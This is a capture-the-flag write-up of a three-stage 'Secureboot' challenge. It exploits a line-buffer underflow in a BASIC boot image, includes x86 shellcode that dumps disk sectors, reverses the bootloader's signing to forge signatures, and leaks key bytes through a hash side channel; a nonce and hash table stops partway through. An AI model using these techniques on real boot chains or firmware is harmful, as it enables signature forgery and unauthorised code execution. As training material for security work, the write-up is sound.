# Secureboot

> There are two versions of the bootloader, one with a test key and one with a production key. This challenge has three stages,
>
> * first you need to obtain the test bootloader image
> * then you have to reverse engineer it and sign your own image with the test key
> * at the end you have to sign the image with the production key to prove that you are l33t
>
> The flag for each stage in on an attached drive. Details on the deployment can be found in the Dockerfile.

* **Categories:** Pwn, Reverse Engineering, Crypto
* **Difficulty:** Medium
* **Author:** localo

## Exploration

### Setup

Our entrypoint is a TCP connection to the `server.py` program.
Each time a connection is made, it spawns the QEMU emulator with 3 disks attached.
Stdin and stdout/stderr are mapped to the TCP socket.

```py
cmd = [
    '/usr/bin/qemu-system-i386',
    '-drive', f'format=raw,file={bootloader_path}',
    '-drive', f'format=raw,file={mbr_path}',
    '-drive', f'format=raw,file={flag_path}',
    '-display', 'curses',
    '-monitor', 'none',
]
if no_graphic:
    cmd += ['-nographic']
```

The three disks being provided are user controllable.
  1. The bootloader disk can be set to either _TEST_ or _PROD_,
     though we cannot trivially see its content.
  2. The second disk is 520 byte large and entirely user-controllable (uploaded on startup).
     The challenge files contain four example inputs.
  3. The third disk one of three flags depending on the inputs for disks 1 & 2.
     - Flag 1: Disk 1 is _TEST_ bootloader and disk 2 is one of the challenge files.
     - Flag 2: Disk 1 is _TEST_ bootloader and disk 2 is not one of the example inputs.
     - Flag 3: Disk 1 is _PROD_ bootloader.

We can further derive the following info by looking at the QEMU setup:
- The BIOS loads disk 1 (bootloader) at `0x7c00` and jumps to it after system startup.
- Bootloader contains unknown "secure boot" checks that load and verify disk 2.
- If verification of disk 2 passes, the booloader finally jumps to it.
- The system probably never leaves 16-bit real mode.

### Images

The four example inputs for disk 2 are bootable disks (MBR) with their source code available.
- `nanochess/basic`: A BASIC interpreter.
- `nanochess/fbird`: A "Flappy Bird" like game in graphic mode.
- `nanochess/lights`: A game with minimal inputs.
- `daniel-e/tetros`: A Tetris clone in graphic mode.

All four programs run fine as standalone.

```shell
qemu-system-i386 -drive format=raw,file=./basic-test.bin -display curses -monitor none -nographic
```

When providing these images to the challenge server, they seem to execute identically.

### Signature Checks

The last 8 bytes of the disks seem to be some sort of signature / MAC (message authentication code) as they are not used during standalone execution.

When modifying the signature of the `basic` image the bootloader prints the following error message. The hex string stays the same for any signature.

```
Booting from Hard Disk...
Invalid signature!
                  B77FC96268C76D92
```

When modifying the data part, the hex string changes completely.

```
Booting from Hard Disk...
Invalid signature!
                  C2D69D9FDF812900
```

We can thus conclude that the hex string displayed is some sort of hash of the data part.
We can further assume for now that the signature is dependent, i.e. hash-and-sign.

```
> hash(data_1) == hash(data_2)
implies
> hash_mac(data_1) == hash_mac(data_2)
if the following holds
> hash_mac(x) := mac(key, hash(x))
```

The tool [CyberChef](https://gchq.github.io/CyberChef/) bundles a variety of hash and encryption algorithms. Applying those on the first 512 bytes (or 520 bytes with zeroed signature) of the sample images revealed no matches for the hash.

The bootloader is thus treated as a black box with unknown cryptography until we can extract more info.

## Flag 1

_Obtaining the test bootloader image_

None of the available images in perform any disk accesses nor are they supposed to allow arbitrary memory access.
As suggested by the hints, we'll try building a read primitive exploit.

The `basic` image is by far the most interesting.
- It accepts and parses arbitrary text input.
- It addresses ~25 variables to persist data, e.g. `a = 2 + 3`

The other three programs appear to be neat games, but only exhibit primitive reactions to a few keys.
The program's allocated memory can be inspected by running it in QEMU with a debugger attached.

```shell
# Window 1
qemu-system-i386 -display curses -monitor none -drive format=raw,file=./basic-test.bin -s
# Window 2
r2 -b 16 -d gdb://localhost:1234
```

Luckily, the program does not use segmentation – code and data (including user-input) is accessible from the same segment.
The memory map of the `basic` image as follows.

```
[7c00..7e00] ROM
[7e00..7e40] Variables
[7e80..????] Line buffer
```

The `get_variable` function is not exploitable per-se because `and al, 0x1f` bounds the addressable memory to `7e00..7e40`.
([Source](https://github.com/nanochess/bootBASIC/blob/f025672338a552e0a2531cd318f2a55a0efc96c0/basic.asm#L374))
However it does form the basis of a useful arbitrary read-write primitive.
The input `a = 5\r` would write `05 00` (little endian) to address `7e02`.

```asm
        ;
        ; Get variable address.
        ; Also avoid spaces.
        ;
get_variable:
        lodsb               ; Read source
get_variable_2:
        and al,0x1f         ; 0x61-0x7a -> 0x01-0x1a
        add al,al           ; x 2 (each variable = word)
        mov ah,vars>>8      ; Setup high-byte of address
        dec si
```

The line buffer is filled it with characters from command-line input as the user is typing.
Notably, there are no bounds checks at all and it supports undoing input via backspaces.
([Source](https://github.com/nanochess/bootBASIC/blob/f025672338a552e0a2531cd318f2a55a0efc96c0/basic.asm#L481))

```asm
input_line:
        call output
        mov si,line
        push si
        pop di          ; Target for writing line
f1:     call input_key  ; Read keyboard
        stosb           ; Save key in buffer
        cmp al,0x08     ; Backspace?
        jne f2          ; No, jump
        dec di          ; Get back one character
        dec di
f2:     cmp al,0x0d     ; CR pressed?
        jne f1          ; No, wait another key
        ret             ; Yes, return
```

By sending enough backspaces, `ES:DI` (destination register) is manipulated to point to area occupied by the ROM.

Placing shellcode into the code area using the line buffer underflow is not practical.
BIOS input is roughly limited to ASCII-printable characters: The high character range `0x80..0xff` is unusable and gets mangled.

The area just before the end of the ROM contains a lookup table of function pointers of user command handlers.

```
0000:7dc0  e105 0080 c304 6e65 7700 7c05 6c69 7374  ......new.|.list
0000:7dd0  6b7c 0472 756e 4c7d 0670 7269 6e74 827d  k|.runL}.print.}
0000:7de0  0669 6e70 7574 8a7c 0369 662a 7c05 676f  .input.|.if*|.go
0000:7df0  746f 487d 0773 7973 7465 6d46 7d01 55aa  toH}.systemF}.U.
```

Luckily, most memory addresses are "printable enough".
A pointer to the variable buffer `0x7e02`, can be written via line input unchanged.
As stated earlier, using variable input we can write a small piece of arbitrary bytes with no bounds restrictions.

This gives us all pieces to gain code execution:
1. Send backspaces to place the line input pointer at `0x7dfb`.
2. Replace the `system` comamnd handler:
   Write bytes `02 7e`.
3. Move line input pointer forward to avoid memory corruption:
   Write bytes `01` (list terminator) and `41 41` (padding).
4. Write `0d` (carriage return) to reset line input.
5. Place shellcode using a series of variable writes `a = ???\r`, `b = ???\r`, etc.
6. Jump to shellcode by writing `system\r`.

The shellcode has the following purpose:
- Read sectors of the bootloader disk or flag disk.
- Dump contents to the terminal.

Due to size constraints, the dump procedure is very simple.
- Loop over each byte in memory.
- Base16-encode the memory content with alphabet `ABCDEFGHIJKLMNOP`.
  - `print(char(0x41 + (al >> 4)))`
  - `print(char(0x41 + (al & 0x0f)))`

```
# Load flag into memory using "read sector" BIOS interrupt.
    mov si, 0    # point source to 0000:0000
    mov ax, 0x202
    mov bx, 0x9000
    #mov dx, 0x80 # 0x80: Bootloader disk
    mov dx, 0x82 # 0x82: Flag disk
    mov cx, 0x1
    int 0x13

# Loop forever over memory and print it out.
loop:
    lodsb        # load byte and increment
    mov ch, al
    mov cl, al

    # setup print
    mov ah, 0x0e
    mov bx, 0x0007

    # calc base16 encoding
    shr ch, 4    # upper 4 bits
    add ch, 0x41
    mov al, ch
    int 0x10

    and cl, 0x0f # lower 4 bits
    add cl, 0x41
    mov al, cl
    int 0x10

    jmp loop
```

To assemble, use [Keystone](https://www.keystone-engine.org/).

```shell
kstool -b x16 "$(cat ./shellcode.s)" 7e02 | xxd -i -c8
```

Go was used to automate the upload of input and download/decoding of the memory dump.

```shell
python3 -c 'print(0x9000)'
36864

dd bs=1 if=dump_with_test_flag.bin skip=36864 status=none | strings | head -n1
...FLAG...

dd bs=1 count=512 if=dump_with_test_bootloader.bin skip=36864 of=test_bootloader.bin
```

The test environment can now be run locally.

```shell
qemu-system-i386 \
  -display curses -monitor -nographic \
  -drive format=raw,file=./test_booloader.bin \
  -drive format=raw,file=./basic-test.bin
```

Note: While the bootloader is still loaded at `0x0600`, some important initialized data has been overriden already, modifying the hash check behavior, and failing sig verify.
This is why we need a clean dump of the bootloader disk.

## Flag 2

_Reverse engineer the bootloader and sign your own image with the test key_

Again, we start with a debugger session, this time with the bootloader attached.
This time, execution is halted until the debugger connects to allow tracing the bootloader step by step.

```shell
# Window 1
qemu-system-i386 \
  -s -S \
  -display curses -monitor -nographic \
  -drive format=raw,file=./test_booloader.bin \
  -drive format=raw,file=./basic-test.bin
# Window 2
r2 -b 16 -d gdb://localhost:1234
```

Additionally, we load the full memory dump from earlier into [Ghidra](https://ghidra-sre.org/).

### Bootloader Relocation

Upon startup, the bootloader relocates itself from `0x7c00` to `0x0600`.

```asm
0000:7c01 bc007c          MOV        SP,0x7c00
0000:7c04 be007c          MOV        SI,0x7c00
0000:7c07 bf0006          MOV        DI,0x600
0000:7c0a b98000          MOV        CX,0x80
0000:7c0d fc              CLD
0000:7c0e f366a5          MOVSD.REP  ES:DI,SI
0000:7c11 66ea19060       JMPF       0x0:LAB_0000_0619
```

Then, it loads the second drive (program) to `0x7c00`.

```asm
0000:061a b80202          MOV        AX,0x202
0000:061d bb007c          MOV        BX,0x7c00
0000:0620 b281            MOV        DL,0x81
0000:0622 b90100          MOV        CX,0x1
0000:0625 b600            MOV        DH,0x0
0000:0627 cd13            INT        0x13
```

### Hash Algorithm

`0764..076c` (sig_1) stores a copy of the hash seen in the bootloader error screen.
`076c..0774` (sig_2) appears to be a scratch area for hash calculation.
The hash is written by the main routine code at `0629..066b`.

Tracing the outer loop of the hash algorithm (at `0630`) reveals that
the algorithm steps along the disk in blocks of eight bytes.

```
:> db 0000:0630

:> dc
hit breakpoint at: 0x630
:> px16 @0000:0764
- offset -  0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0000:0764  0000 0000 0000 0000 0000 0000 0000 0000  ................
:> dr edi
0x00007c00

:> dc
hit breakpoint at: 0x630
:> px16 @0000:0764
- offset -  0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0000:0764  7fbc de37 1f78 7dc7 0000 0000 0000 0000  ...7.x}.........
:> dr edi
0x00007c08

:> dc
hit breakpoint at: 0x630
:> px16 @0000:0764
- offset -  0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0000:0764  ef15 531a ff28 8a0c 7fbc de37 1f78 7dc7  ..S..(.....7.x}.
:> dr edi
0x00007c10
```

At `069c` is a one-way function encrypting an 8-byte block of data using the bootloader ROM as the encryption key.

Together, the hash function processes blocks as follows.
- Swap `sig_2 <- sig_1` (at `0632..063c`)
- `sig_1 <- encrypt(block, key)` (at func `069c`)
- `sig_1 <- XOR(sig_1, sig_2)` (at `0647..065c`)

### Signature check decryption algorithm

The function at `06c2` transforms the "signature" at `7e00..7e08` (i.e. the last 8 bytes of the second disk).
Before, it is `f93a50e96235aa11`, afterwards it is `b77fc96268c76d92` (the same value as the decrypted hash).

Reverse engineering of the function's content reveals this pseudocode.

```go
func decrypt8(loader *[512]byte, data *[8]byte, key *[8]byte) {
	for cx := uint16(0x100); cx > 0; cx-- {
		dx1 := (cx - 1) % 8
		dx2 := cx % 8
		data[dx2] = bits.RotateLeft8(data[dx2], 7) - loader[data[dx1]+key[dx]]
	}
}
```

More precisely, this decryption algorithm reads the following input:
- The encrypted hash at `7e00..7e08`
- The bootloader content `0600..0700`
- The encryption key at `06ed..06f5` (value `4100410041004100`)

After decryption, this value is then compared against the result of the hash function.

```
0000:0678 be007e          MOV        SI,0x7e00
0000:067b 8d3e6407        LEA        DI,[0x764]
0000:067f b90800          MOV        CX,0x8
0000:0682 f3a6            CMPSB.REPE ES:DI,SI
```

In order to get the second flag we need to build the inverse function to the decryption algorithm.
The encryption function is attained by reversing the order of operations within the loop
and reversing the order of iteration.

```go
func encrypt8(loader *[512]byte, data *[8]byte, key *[8]byte) {
	for cx := uint16(0); cx < 0x100; cx++ {
		dx2 := (cx + 1) % 8
		dx1 := cx % 8
		data[dx2] = bits.RotateLeft8(data[dx2]+loader[data[dx1]+key[dx1]], 1)
	}
}
```

### Getting the flag

All cryptographic operations so far have been added to `crypto.go` (hash, decrypt, encrypt).

To test our tool, we run it over the test bootloader & basic image.

```
% go run ./crypto.go -sign -bootloader=./test_booloader.bin -target=./basic-test.bin -key 4100410041004100
Image hash:      b77fc96268c76d92
Image signature: f93a50e96235aa11
Expected hash:   b77fc96268c76d92
OK
Fake signature:  f93a50e96235aa11
```

This allows us to craft a basic signed program dumping the flag.

```
b80202bb0090ba8200b90100cd13be0090ac08c07406b40ecd10ebf5faf4
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000
000067675399978ff00bEOF
```

## Flag 3

_Sign the image with the production key_

As expected, we get a signature error when trying to run the "basic" test-signed image on the prod environment.

What's interesting however is that the signature hash is now different: `EF9580875A3CE091`.
Presumably, only the encryption key is different between test and prod.
The hash algorithm does not directly access the encryption key (`06ed..06f5`).
It does however index the loader memory in `0600..0700`.

The reconstructed hash function is extended to report which bootloader bytes have been sampled.
The following command returns how often a byte in the bootloader has been read by the block algorithm of the hash function.

```shell
go run crypto.go -sample -bootloader=test_bootloader.bin -target=basic-test.bin
...
  loader[ed] =   63
  loader[ee] =   61
  loader[ef] =   67
  loader[f0] =   54
  loader[f1] =   72
  loader[f2] =   65
  loader[f3] =   77
  loader[f4] =   78
...
```

At first sight, it looks like the bootloader bytes are uniformly sampled.

There is a fatal flaw however. If we can manipulate the block algorithm of the hash function to only sample loader bytes set to zero, the butterfly-effect of the hash function never kicks in.

```go
func (h *bootHasher) block(data [8]byte) {
	dx := uint16(0)
	al := h.sig1[0]                      // hash is zero-initialized
	for i := 0x100; i > 0; i-- {
		al += data[dx]               // al += any(0..8)
		al = h.loader[al]            // al = 0
		dx = (dx + 1) % 8

		al += h.sig1[dx]             // al += 0
		al = bits.RotateLeft8(al, 1) // (0 << 1) == 0
		h.sig1[dx] = al              // hash stays zero
	}
}
```

This allows us to craft a program with the hash zero both on the test and prod bootloaders.

```
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc
fcfcc983957b5ca858cdEOF
```

As expected, the hash function only samples byte `0xfc`.

```
go run crypto.go -sample -bootloader=test_bootloader.bin -target=fc.bin
...
  loader[fb] =    0
  loader[fc] = 16384
  loader[fd] =    0
...
```

This forms a simple, but exploitable side-channel:
Crafted input allows using the hash function to check for equality of certain bytes, including the signing key bytes.

If we can keep the hash zero up until the very last block,
we can brute force the last 100 hash rounds into only accessing only one target byte.

This reduces the complexity of attacking the key from `2^64` (brute force) to about `8*256` (fairly cheap).

Our attack involves brute forcing the block of the last two bytes until we can find one input
that accesses only the target byte within the search region (key slice of `ed..f5`).

```
..fcfcfc0000
..fcfcfc0001
..fcfcfc0002
```

The hash state will change based on the (unknown) target byte in the bootloader.
This may cause the algorithm to access other key bytes as a result.

Therefore, we will have to find such a nonce for each possible value of the target byte (256 times).
Then, repeat this step for each target byte, beginning with `ed`.

This has been implemented in the "leak" command of `crypto.go`.
It takes about 5 minutes to scan through about `65536 * 256` (about 16.8 million) combinations of the bootloader image (skipping unnecessary calculations).

```
go run ~/prj/cscg-2022/secureboot/crypto.go -leak -bootloader=./test_bootloader_original.bin -leak-index=0xed
```

We are left with 256 crafted images, one for each possible value of the `ed` byte.
If one of the following hashes matches, we've found the correct value.

<details>
<summary>Suffix map for byte <code>ed</code></summary>
<pre>
loader[ed]=00 nonce=0ce7 hash=c0e2ce1b9df15271
loader[ed]=01 nonce=06d0 hash=27a168ac5baa2705
loader[ed]=02 nonce=0dc7 hash=9ffe800a159d3930
loader[ed]=03 nonce=0155 hash=f65c9a98dffc5b47
loader[ed]=04 nonce=058e hash=19cc2d369ab3d521
loader[ed]=05 nonce=0590 hash=723ab8dc23605a35
loader[ed]=06 nonce=058e hash=7dbf2565b56296a0
loader[ed]=07 nonce=10aa hash=2829eaca43e0557b
loader[ed]=08 nonce=0470 hash=fde15d2d62cd138c
loader[ed]=09 nonce=10aa hash=f9b85d1029a58883
loader[ed]=0a nonce=01dd hash=1ac586ef891449dd
loader[ed]=0b nonce=04fa hash=bc568fd768f14e72
loader[ed]=0c nonce=0313 hash=123b4bc60bcf7573
loader[ed]=0d nonce=0780 hash=071fbd40c3797876
loader[ed]=0e nonce=01fd hash=21ada20981387d85
loader[ed]=0f nonce=0b27 hash=ab9373802061d74b
loader[ed]=10 nonce=19d5 hash=2a4eee966be84673
loader[ed]=11 nonce=09f2 hash=0a13ee65acd74a09
loader[ed]=12 nonce=08d5 hash=02aaab24b354b242
loader[ed]=13 nonce=10aa hash=195b0d007c5b3eb5
loader[ed]=14 nonce=0755 hash=9b51962425497520
loader[ed]=15 nonce=040f hash=b70454256b2d40cd
loader[ed]=16 nonce=0320 hash=97df9a20cce4bc07
loader[ed]=17 nonce=0673 hash=488506a5247507b3
loader[ed]=18 nonce=008c hash=a4963b7d3c669480
loader[ed]=19 nonce=064b hash=3f0dd3e6a65f8f1d
loader[ed]=1a nonce=1678 hash=3030cedb5bc32209
loader[ed]=1b nonce=222d hash=07011b1051c2b5cd
loader[ed]=1c nonce=00f4 hash=375cb0e2e1134f14
loader[ed]=1d nonce=04fa hash=b6b2cec2d82bffdd
loader[ed]=1e nonce=01d2 hash=9a8105bbacc6ab55
loader[ed]=1f nonce=058f hash=1fc1e2eb996430eb
loader[ed]=20 nonce=04dd hash=8c7f12365df96a7a
loader[ed]=21 nonce=10aa hash=faba67a851db8293
loader[ed]=22 nonce=0231 hash=391851d4ac6767b6
loader[ed]=23 nonce=0447 hash=be43acb9e865bc63
loader[ed]=24 nonce=008c hash=a58c20222b93d6d6
loader[ed]=25 nonce=1025 hash=dc8abb089a7f070b
loader[ed]=26 nonce=04fa hash=e0a7a12c26fc0178
loader[ed]=27 nonce=0320 hash=26032c20fe8510b4
loader[ed]=28 nonce=0c32 hash=602c07bc7e4a8dc5
loader[ed]=29 nonce=0305 hash=672f15c62293a828
loader[ed]=2a nonce=040f hash=0c1dd2d543ffca82
loader[ed]=2b nonce=04fa hash=aa4bdf6b388f7ad7
loader[ed]=2c nonce=04b3 hash=d682344fef174f20
loader[ed]=2d nonce=04fa hash=356fd93800eae3ea
loader[ed]=2e nonce=164b hash=8c11f9b664ad4e02
loader[ed]=2f nonce=0183 hash=6dcdbab4740f57f6
loader[ed]=30 nonce=040f hash=a33bb4e39ed2c9fa
loader[ed]=31 nonce=04fa hash=562398c74a01c0bc
loader[ed]=32 nonce=08d5 hash=7640a0ba74826b17
loader[ed]=33 nonce=00cb hash=7ed60c26a8a35a93
loader[ed]=34 nonce=0532 hash=16c1bde86ca42e2f
loader[ed]=35 nonce=0710 hash=aeb17c7fa5802b90
loader[ed]=36 nonce=0b0e hash=3196cfca1468f4bb
loader[ed]=37 nonce=1044 hash=2c522bb4ca46c833
loader[ed]=38 nonce=0532 hash=9da6ca982ea1f214
loader[ed]=39 nonce=058e hash=f9709aef66702ef5
loader[ed]=3a nonce=0320 hash=325ae05b30c14701
loader[ed]=3b nonce=0313 hash=6246820ff9baa3ed
loader[ed]=3c nonce=0db4 hash=b53189d3b82a91af
loader[ed]=3d nonce=0c32 hash=009a505765a22bd9
loader[ed]=3e nonce=0320 hash=3b0f8a8db5e6bc4c
loader[ed]=3f nonce=0134 hash=41bcb2054af9d60b
loader[ed]=40 nonce=1791 hash=da62a7e724c4a97a
loader[ed]=41 nonce=0718 hash=3d495b2442fc6aeb
loader[ed]=42 nonce=10aa hash=052bb256c1fd276b
loader[ed]=43 nonce=0145 hash=835dca582b5afd7e
loader[ed]=44 nonce=04dd hash=db76af15db8e2646
loader[ed]=45 nonce=0729 hash=dd172f940b097e0b
loader[ed]=46 nonce=04fa hash=80e43d97ddc0c4bf
loader[ed]=47 nonce=0383 hash=ebb46861fdbf8f91
loader[ed]=48 nonce=0434 hash=ca3057340bb06979
loader[ed]=49 nonce=05ce hash=c8cfcf3aaabfd92a
loader[ed]=4a nonce=0ea9 hash=3f7f28f94d319e7c
loader[ed]=4b nonce=0320 hash=f3aa8dac63bf575a
loader[ed]=4c nonce=059b hash=64411372cf049827
loader[ed]=4d nonce=1ba8 hash=21913a5a001f2011
loader[ed]=4e nonce=03ed hash=f8b03d7e045135c3
loader[ed]=4f nonce=0320 hash=4a58c568dc4f5dfb
loader[ed]=50 nonce=06bb hash=e70b0e20b71ab5a2
loader[ed]=51 nonce=04dd hash=90690e151089006d
loader[ed]=52 nonce=0683 hash=6921a7e6457cbba3
loader[ed]=53 nonce=039d hash=b77c42704cce26c2
loader[ed]=54 nonce=03c0 hash=e217353687603c13
loader[ed]=55 nonce=006e hash=07007d5ff05a01d2
loader[ed]=56 nonce=001a hash=3fb6e68b6878d190
loader[ed]=57 nonce=04fa hash=fdaf9609999d84d6
loader[ed]=58 nonce=0d02 hash=1b2d372e5fd8a063
loader[ed]=59 nonce=0685 hash=69553ee49200ad4c
loader[ed]=5a nonce=10aa hash=378e23fa5d3c7301
loader[ed]=5b nonce=0265 hash=bdec507270a265e9
loader[ed]=5c nonce=08d5 hash=c57997bcd425be26
loader[ed]=5d nonce=033b hash=9a28fb2ca80e7e31
loader[ed]=5e nonce=04dd hash=08e84fb1d04b25df
loader[ed]=5f nonce=116f hash=9c59e47813160a53
loader[ed]=60 nonce=12b2 hash=b5be817940968abd
loader[ed]=61 nonce=04fa hash=9575481548d9a3d3
loader[ed]=62 nonce=0b35 hash=a1bf13430dd415b7
loader[ed]=63 nonce=04fa hash=0484d63765b66c3a
loader[ed]=64 nonce=05ed hash=97874bb4849ff3f7
loader[ed]=65 nonce=212e hash=057da237002c262d
loader[ed]=66 nonce=04ef hash=05d8059734198666
loader[ed]=67 nonce=04fa hash=acb1d564e57c08b3
loader[ed]=68 nonce=04dd hash=570bd20b24015bd9
loader[ed]=69 nonce=10aa hash=de03092ba7c7274e
loader[ed]=6a nonce=04fa hash=3843c0fa35e7e5b3
loader[ed]=6b nonce=04fa hash=be96105b2fc4b1a0
loader[ed]=6c nonce=07f5 hash=b283a0fb44e215a1
loader[ed]=6d nonce=00f4 hash=e485074fea6815aa
loader[ed]=6e nonce=288e hash=19a430859cafbdff
loader[ed]=6f nonce=04ef hash=da1afa5b7a68b5ef
loader[ed]=70 nonce=07ae hash=1bbc34e006060ef6
loader[ed]=71 nonce=0320 hash=ecc9068c06d69146
loader[ed]=72 nonce=0590 hash=65bd22a8614b29d9
loader[ed]=73 nonce=04dd hash=9ab470b8c3bd27c1
loader[ed]=74 nonce=0447 hash=6d21d03c598e4180
loader[ed]=75 nonce=0b93 hash=5879a0dd91168dca
loader[ed]=76 nonce=007c hash=f00cb00ec98cc898
loader[ed]=77 nonce=14d4 hash=225a1bfa64d9f002
loader[ed]=78 nonce=040f hash=55d7739cedb80805
loader[ed]=79 nonce=03ed hash=50b3ac522e1e66b0
loader[ed]=7a nonce=025c hash=590aa3fab60f23c1
loader[ed]=7b nonce=0728 hash=5a179fa2bdfdef02
loader[ed]=7c nonce=0cd5 hash=c7fe18caa5c77ff0
loader[ed]=7d nonce=04fa hash=99c9d9a176da65c1
loader[ed]=7e nonce=0134 hash=ef2823093093b086
loader[ed]=7f nonce=0997 hash=f9262028a9cd7ef3
loader[ed]=80 nonce=08d5 hash=e13a1bb02285d4bd
loader[ed]=81 nonce=0b0e hash=204ac470bc14d554
loader[ed]=82 nonce=13fb hash=002236ba731b5851
loader[ed]=83 nonce=040f hash=afcb7aa997ca0684
loader[ed]=84 nonce=2b12 hash=238926cb65cb6c66
loader[ed]=85 nonce=10aa hash=76a4ee321f595b07
loader[ed]=86 nonce=0c32 hash=12b3af2391aa48dc
loader[ed]=87 nonce=0532 hash=a687e262d139603b
loader[ed]=88 nonce=0729 hash=85c978b308474f8e
loader[ed]=89 nonce=0d83 hash=d9ef131f1ab5cda6
loader[ed]=8a nonce=0704 hash=a5149860602104f6
loader[ed]=8b nonce=0e7c hash=3aeff0b1c4a3262e
loader[ed]=8c nonce=13fb hash=638ca3159a5b164d
loader[ed]=8d nonce=0485 hash=823d0c4407035779
loader[ed]=8e nonce=046c hash=eb1d7ce54a91c5e2
loader[ed]=8f nonce=0b35 hash=5939b6fa9a17b256
loader[ed]=90 nonce=116f hash=a837bc237305112e
loader[ed]=91 nonce=0673 hash=1a7c40a89db4f3d0
loader[ed]=92 nonce=0d02 hash=3143697993d48f95
loader[ed]=93 nonce=04fa hash=ac27777fd5a1a6c6
loader[ed]=94 nonce=0757 hash=37194a407aabfbcb
loader[ed]=95 nonce=1678 hash=b2a703a91ec85162
loader[ed]=96 nonce=03f5 hash=cc78b2da9d7c6509
loader[ed]=97 nonce=04fa hash=5fd591c0c4d73017
loader[ed]=98 nonce=09f3 hash=5a46ab38627b3915
loader[ed]=99 nonce=04dd hash=20c00d816714bc6b
loader[ed]=9a nonce=01e6 hash=63fba1e396cbd8f4
loader[ed]=9b nonce=1b3e hash=261c441940500191
loader[ed]=9c nonce=04dd hash=a541b02a22a9af7a
loader[ed]=9d nonce=1bc2 hash=cbd778d42b02070c
loader[ed]=9e nonce=04dd hash=72ce8c4708b053fc
loader[ed]=9f nonce=164b hash=4c40c6ffcace4e9b
loader[ed]=a0 nonce=000d hash=5d7d97ee51b59275
loader[ed]=a1 nonce=0dae hash=033808091f452365
loader[ed]=a2 nonce=0842 hash=b3db05ff1aaa17f1
loader[ed]=a3 nonce=04fa hash=3c06a7370097c178
loader[ed]=a4 nonce=04fa hash=f95f501b40dc3402
loader[ed]=a5 nonce=0fd9 hash=19b8ce60564b12fd
loader[ed]=a6 nonce=04fa hash=987477c9ec00e8ff
loader[ed]=a7 nonce=0b41 hash=e3563ac77b838c53
loader[ed]=a8 nonce=07fc hash=69e2642f27ba5e0a
loader[ed]=a9 nonce=0cd5 hash=46762d3c9567d866
loader[ed]=aa nonce=08b2 hash=f6255e9e37bf357b
loader[ed]=ab nonce=03ed hash=091fcba8ee2610ab
loader[ed]=ac nonce=0ad9 hash=9c6ed5abeab388eb
loader[ed]=ad nonce=01f8 hash=b7a389da558076a5
loader[ed]=ae nonce=025c hash=49c74b5f77638281
loader[ed]=af nonce=040f hash=7854cd95181bbc1b
loader[ed]=b0 nonce=01f7 hash=43ce18995c132812
loader[ed]=b1 nonce=164b hash=aaa12550a75457b8
loader[ed]=b2 nonce=02a0 hash=b58d5531c09bb3d8
loader[ed]=b3 nonce=01e6 hash=384200a6c83eab65
loader[ed]=b4 nonce=0729 hash=081afecfcd3f2912
loader[ed]=b5 nonce=04fa hash=78871de6a4091756
loader[ed]=b6 nonce=0b42 hash=d637e4ed1eff5f97
loader[ed]=b7 nonce=0272 hash=0a35870b4499b820
loader[ed]=b8 nonce=0320 hash=39dfc070355a08cd
loader[ed]=b9 nonce=04fa hash=ba535ecff13cd626
loader[ed]=ba nonce=04fa hash=e05a7f21e745916d
loader[ed]=bb nonce=0ea8 hash=a10c8fe27954b1d5
loader[ed]=bc nonce=0f68 hash=fba2560e0211c402
loader[ed]=bd nonce=0e29 hash=8c43e49cbccb68a1
loader[ed]=be nonce=0704 hash=3a702b7a6f39c339
loader[ed]=bf nonce=0415 hash=33efb392a2ab1dff
loader[ed]=c0 nonce=0256 hash=44cd39763ac1de83
loader[ed]=c1 nonce=04bb hash=d8da7a8ea3c6d9a7
loader[ed]=c2 nonce=0155 hash=1b1826fb14948c58
loader[ed]=c3 nonce=01dd hash=272edbcc34045d78
loader[ed]=c4 nonce=03c0 hash=82119a796ba6c965
